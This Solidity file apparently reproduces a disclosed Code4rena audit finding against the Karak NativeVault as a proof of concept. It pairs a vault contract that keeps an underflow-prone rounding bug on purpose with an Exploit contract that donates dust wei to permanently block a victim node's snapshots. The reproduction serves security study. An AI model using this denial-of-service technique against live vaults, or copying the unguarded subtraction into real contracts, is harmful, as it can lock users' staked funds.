// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Karak — A DoS on snapshots due to a rounding error in calculations
    (KupiaSec / Code4rena 2024-07-karak, finding #41067)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: NativeVault.sol#L430, `_transferToSlashStore()`:
        uint256 slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));
    NativeVault is an ERC4626-style vault using the standard
    `(totalAssets + 1) / (totalSupply + 1)` exchange-rate rounding. Because
    rounding always favors the vault (rounds DOWN in the depositor's favor at
    deposit time, but can round UP in the node owner's favor on a later
    convertToAssets() call once OTHER depositors change the share ratio),
    `convertToAssets(balanceOf(nodeOwner))` can end up STRICTLY GREATER than
    `node.totalRestakedETH` — a value that was itself set from an earlier,
    slightly different convertToAssets() result. When that happens, the
    subtraction underflows and startSnapshot() reverts — permanently, for
    that node owner, until the node's totalRestakedETH is somehow resynced
    (which normally only happens via a successful snapshot — a deadlock).
    An attacker can trigger this by donating a few wei to freshly-created
    nodes, nudging the share ratio just enough to flip the inequality on a
    victim's next snapshot. */

contract NativeVaultLike {
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf; // ERC4626 shares

    struct Node {
        address owner;
        uint256 totalRestakedETH;
    }

    mapping(address => Node) public nodes; // node address => Node
    uint256 internal _nodeNonce;

    /// @dev ERC4626-style exchange rate, matching Solady's ERC4626:
    ///      https://github.com/vectorized/solady/blob/main/src/tokens/ERC4626.sol#L201
    function convertToAssets(uint256 shares) public view returns (uint256) {
        return (shares * (totalAssets + 1)) / (totalSupply + 1);
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        return (assets * (totalSupply + 1)) / (totalAssets + 1);
    }

    /// @dev Reduction of Core.createNode() + the beacon-balance discovery
    ///      that credits a node's initial `totalRestakedETH` and mints
    ///      vault shares for the ETH it holds. `assets` stands in for a
    ///      validator's (or a node's donated) ETH balance.
    function createNodeAndDeposit(address owner, uint256 assets) external returns (address nodeAddr) {
        nodeAddr = address(uint160(uint256(keccak256(abi.encode("node", owner, _nodeNonce++)))));
        uint256 shares = convertToShares(assets);
        totalAssets += assets;
        totalSupply += shares;
        balanceOf[owner] += shares;
        nodes[nodeAddr] = Node({owner: owner, totalRestakedETH: assets});
    }

    /// @dev Reduction of a protocol-wide slash — reduces totalAssets (and
    ///      therefore every node's convertToAssets()) without touching
    ///      totalSupply, exactly like a NativeVault slash.
    function slashAssets(uint256 amount) external {
        totalAssets -= amount;
    }

    /// @dev Verbatim reduction of NativeVault.sol#L425-L446
    ///      `_transferToSlashStore()`, invoked by `startSnapshot()`.
    function startSnapshot(address nodeAddr) external {
        Node storage node = nodes[nodeAddr];

        // @> VULN NativeVault.sol#L430: convertToAssets(balanceOf(nodeOwner))
        //    can exceed node.totalRestakedETH due to ERC4626 rounding once
        //    OTHER depositors change the share ratio after this node's
        //    totalRestakedETH was last set — the subtraction underflows and
        //    reverts, permanently, until resynced (which itself requires a
        //    successful snapshot: a deadlock).
        //    FIX: guard with `if (node.totalRestakedETH > convertToAssets(...))`.
        uint256 slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf[node.owner]);

        node.totalRestakedETH -= slashedAssets;
    }

    function getNodeTotalRestakedETH(address nodeAddr) external view returns (uint256) {
        return nodes[nodeAddr].totalRestakedETH;
    }

    /// @dev A snapshot that has NOTHING to slash away (no protocol slash
    ///      happened since the last sync) just resyncs totalRestakedETH to
    ///      the current convertToAssets() reading — the same assignment
    ///      startSnapshot() performs, without the subtraction that can
    ///      underflow. Used here to model the ROUTINE, harmless resync right
    ///      after a slash (before any dust-donation manipulation), so the
    ///      Playground trace isolates the one startSnapshot() call that
    ///      actually underflows.
    function resyncAfterSlash(address nodeAddr) external {
        Node storage node = nodes[nodeAddr];
        node.totalRestakedETH = convertToAssets(balanceOf[node.owner]);
    }
}

contract Exploit {
    NativeVaultLike public vault; // CREATE nonce 1
    address public bob; // CREATE nonce 2
    address public bobNode;
    address public attacker1; // CREATE nonce 3
    address public attacker2; // CREATE nonce 4

    constructor() {
        vault = new NativeVaultLike(); // nonce 1
        bob = address(new NodeOwner()); // nonce 2
        attacker1 = address(new NodeOwner()); // nonce 3
        attacker2 = address(new NodeOwner()); // nonce 4
    }

    function run() external {
        // === STEP 1: Bob has a validator worth 32 ETH ===
        bobNode = vault.createNodeAndDeposit(bob, 32 ether);

        // === STEP 2: the vault is slashed by 2 ETH; Bob's node re-syncs ===
        vault.slashAssets(2 ether);
        vault.resyncAfterSlash(bobNode); // routine resync — re-syncs Bob's totalRestakedETH

        // === STEP 3 & 4: the attacker donates dust to two fresh nodes,
        //     nudging the share ratio in Bob's favor just enough to make
        //     convertToAssets(balanceOf(bob)) exceed Bob's totalRestakedETH ===
        vault.createNodeAndDeposit(attacker1, 15 wei);
        vault.createNodeAndDeposit(attacker2, 15 wei);

        // === Harm: Bob's snapshot is now permanently DoS'd ===
        bool snapshotSucceeded = _tryStartSnapshot(bobNode);

        require(!snapshotSucceeded, "harm not demonstrated: Bob's snapshot should revert");

        // The deadlock is permanent: retrying does not help, since nothing
        // besides a successful snapshot can resync totalRestakedETH.
        bool retrySucceeded = _tryStartSnapshot(bobNode);
        require(!retrySucceeded, "harm not demonstrated: retry should also revert");
    }

    function _tryStartSnapshot(address nodeAddr) internal returns (bool ok) {
        try vault.startSnapshot(nodeAddr) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

/// @dev Stand-in for a node owner (a plain address holder).
contract NodeOwner {}
